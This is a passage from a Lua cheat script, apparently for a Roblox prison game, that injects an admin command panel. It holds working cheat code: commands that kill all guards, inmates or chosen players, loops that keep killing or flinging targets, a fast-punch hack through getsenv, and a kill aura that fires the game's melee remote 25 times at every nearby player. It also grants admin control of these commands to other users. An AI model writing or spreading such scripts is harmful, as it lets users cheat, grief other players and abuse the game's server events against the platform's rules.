		Chat("/w "..Player.Name.." "..Prefix.."killall "..Prefix.."killothers "..Prefix.."killinmate "..Prefix.."killinmates "..Prefix.."killguard "..Prefix.."killguards "..Prefix.."killcriminals "..Prefix.."killcriminal "..Prefix.."void [plr]")
		Chat("/w "..Player.Name.." "..Prefix.."spamarrest [plr] "..Prefix.."unspamarrest "..Prefix.."disconnect "..Prefix.." "..Prefix.."beam [plr]")
		Chat("/w "..Player.Name.." "..Prefix.."cmd "..Prefix.."cmds") wait(.1)
	end
end

game.Players.LocalPlayer.Chatted:Connect(PlayerChatted)

spawn(function()
	while wait() do
		for i,v in pairs(LoopKill) do
			pcall(function()
				if v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.Humanoid.Health ~= 0 then
					Kill(v.Player)
				end
			end)
		end
	end
end)

spawn(function()
	while wait() do
		for i,v in pairs(LoopBeam) do
			pcall(function()
				if v and v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.HumanoidRootPart then
					Beam(v.Player, math.huge, 1)
				end
			end)
		end
	end
end)

spawn(function()
	while wait() do
		if States.Fast_Punch == true then
			pcall(function()
				getsenv(game.Players.LocalPlayer.Character.ClientInputHandler).cs.isFighting = false
			end)
		end
	end
end)

coroutine.wrap(function()
	while wait() do
		if States.Kill_Aura then
			for i,v in pairs(game.Players:GetPlayers()) do
				pcall(function()
					if v ~= game.Players.LocalPlayer then
						local Distance = (v.Character:FindFirstChildOfClass("Part").Position - game.Players.LocalPlayer.Character:FindFirstChildOfClass("Part").Position).magnitude
						if Distance <= 10 then
							for i = 1,25 do
								game.ReplicatedStorage.meleeEvent:FireServer(v)
							end
						end
					end
				end)
			end
		end
	end
end)()

function CheckPermissions(Player)
	Player.Chatted:Connect(function(Message)
		if Admin[Player.UserId] then
			AdminPlayerChatted(Message, Player)
		end
	end)
end

game.Players.PlayerRemoving:Connect(function(Player)
	if States.Notify then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Game",
			Text = Player.DisplayName.." Rage Quit",
			Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
		})
	end
	if States.ChatNotify then
		Chat(Player.DisplayName.." Rage Quit")
	end
end)

game.Players.PlayerAdded:Connect(function(Player)
	if States.Notify then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Game",
			Text = Player.DisplayName.." Joined",
			Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
		})
	end
	if States.ChatNotify then
		Chat(Player.DisplayName.." Joined The Server")
	end
	CheckPermissions(Player)
	CopyChat(Player)
	Died(Player)
	PlayerPickUp(Player)
end)

for i,v in pairs(game.Players:GetPlayers()) do
	if v ~= game.Players.LocalPlayer then
		CheckPermissions(v)
		CopyChat(v)
		Died(v)
		PlayerPickUp(v)
	end
end

game.Players.LocalPlayer.CharacterAdded:Connect(function()
	States.CAN = false
end)

FindCmd.Changed:Connect(function()
	if FindCmd.Text ~= "" then
		for i,v in pairs(CmdHandler:GetChildren()) do
			if v:IsA("TextButton") then
				if not string.lower(v.Text):match(string.lower(FindCmd.Text)) then
					v.Parent = Background
					v.Visible = false
				end
			end
		end
		for i,v in pairs(Background:GetChildren()) do
			if v.Name == "COMMANDS" then
				if string.lower(v.Text):match(string.lower(FindCmd.Text)) then
					v.Parent = CmdHandler
					v.Visible = true
				end
			end
		end
	elseif FindCmd.Text == "" and (#CmdHandler:GetChildren()-1) ~= #Cmd  then
		for i,v in pairs(CmdHandler:GetChildren()) do
			if v:IsA("TextButton") then
				v:Destroy()
			end
		end
		for i,v in pairs(Background:GetChildren()) do
			if v.Name == "COMMANDS" then
				v:Destroy()
			end
		end
		for i = 1,#Cmd do
			local clone = CmdText:Clone()
			clone.Text = Cmd[i].Text
			clone.Name = "COMMANDS"
			local Ins = Instance.new("StringValue", clone)
			Ins.Name = "Title"
			Ins.Value = Cmd[i].Title
			local Ins2 = Instance.new("StringValue", clone)
			Ins2.Name = "TopbarName"
			Ins2.Value = Cmd[i].Text:split(" ")[1]
			clone.Parent = CmdHandler
			clone.MouseButton1Click:Connect(function()
				Execute:CaptureFocus()
				Execute.Text = clone.Text:split(" ")[1]
				Execute.CursorPosition = #Execute.Text + 1
			end)
		end
	end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(Key)
	if Key == Prefix then
		if Prefix ~= "/" then
			Execute:CaptureFocus()
		end
	end
end)

Execute.FocusLost:Connect(function(FocusLost)
	if FocusLost then
		if Execute.Text:sub(1,#Prefix) ~= Prefix then
			PlayerChatted(Prefix..Execute.Text)
		else
			PlayerChatted(Execute.Text)
		end
	end
end)

getgenv().DisableScript = function()
	pcall(function()
		CmdGui:Destroy()
		States = {}
		LoopKill = {}
		LoopTase = {}
		Admin = {}
		ScriptDisabled = true
		for i,v in pairs(game.Lighting:GetChildren()) do
			v.Parent = workspace
		end
	end)
end
 end
}